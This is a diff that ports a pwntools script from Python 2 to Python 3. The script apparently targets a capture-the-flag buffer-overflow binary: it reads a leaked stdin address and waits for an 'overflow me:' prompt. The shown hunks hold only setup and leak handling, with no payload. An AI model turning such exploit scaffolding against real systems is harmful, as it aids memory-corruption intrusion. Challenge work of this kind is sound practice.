@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python3
 import sys
 import time
 import argparse
@@ -6,7 +6,7 @@ from pwn import *
 context.update(arch='i386', os='linux')
 
 def wait_for_prompt(r):
-  print r.recvuntil("overflow me:")
+  print(r.recvuntil(b"overflow me:"))
 
 #--------------------------------------------------------------------------
 if __name__ == "__main__":
@@ -27,9 +27,9 @@ if __name__ == "__main__":
   else:
     r = process(exe)
 
-  r.recvuntil('stdin: 0x')
+  r.recvuntil(b'stdin: 0x')
   leak_stdin = int(r.recvuntil('\n')[:-1],16)
-  print "We have %s as a leak" %hex(leak_stdin)
+  print("We have %s as a leak" %hex(leak_stdin))
   wait_for_prompt(r)
 
 
